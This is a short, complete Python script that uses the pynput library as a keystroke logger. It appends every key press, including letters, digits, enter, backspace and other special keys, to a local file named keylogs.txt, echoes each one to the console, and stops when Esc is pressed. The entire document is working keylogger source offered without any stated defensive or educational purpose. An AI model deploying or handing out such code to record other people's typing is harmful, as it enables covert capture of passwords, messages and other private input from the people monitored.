import pynput.keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            if key.char.isalnum():
                f.write(key.char)
                print(f"Logged: {key.char}")
    except AttributeError:
        with open("keylogs.txt", "a") as f:
            if str(key) in ["Key.space", "Key.enter"]:
                f.write("\n")
                print("Logged: New Line/Enter")
            elif str(key) == "Key.backspace":
                f.write("[BACKSPACE]")
                print("Logged: Backspace")
            else:
                f.write(f"[{key}]")
                print(f"Logged: {key}")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()